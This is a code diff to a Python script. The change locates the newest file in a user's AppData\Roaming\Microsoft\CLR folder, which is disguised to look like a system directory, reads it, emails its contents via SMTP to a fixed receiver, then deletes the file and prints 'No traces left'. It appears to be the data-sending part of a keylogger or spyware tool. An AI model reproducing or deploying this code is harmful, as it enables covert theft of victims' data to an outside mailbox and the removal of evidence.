@@ -3,15 +3,21 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 file_data = ""
+#Find home directory
+home_dir = str(os.path.expanduser('~'))
+print("Home directory " + home_dir)
 #Go to the folder directory
-path = "C:\\Users\\slaby\\AppData\\Roaming\\Microsoft\\CLR"
-os.chdir(path)
+dir1 = home_dir.replace("'\'", "'\\'")#Replace single slash with double slash
+path = dir1 + "\\AppData\\Roaming\\Microsoft\\CLR"
+os.chdir(path)#Enter the directory
 #Find the newest file in the folder
-file_list = glob.glob('C:/Users/slaby/AppData/Roaming/Microsoft/CLR')
+dir2 = home_dir.replace("'\'", "'/'")
+file_dir = dir2 + '/AppData/Roaming/Microsoft/CLR/*'
+file_list = glob.glob(file_dir)
 newest_file = max(file_list, key=os.path.getctime)
-print(newest_file)
+print("Newest file in directory " + newest_file)
 #Open file
-with open('try.txt', 'r') as f:
+with open(newest_file, 'r') as f:
   #Loop through each line of the file
   for line in (line.strip('\n') for line in f):
     file_data += line
@@ -37,3 +43,5 @@ text = message.as_string()
 server.sendmail(sender_email, receiver_email, text)
 server.quit()
 print('Mail Sent')
+os.remove(newest_file)#Delete sent file
+print("Deleted sent file. No traces left")
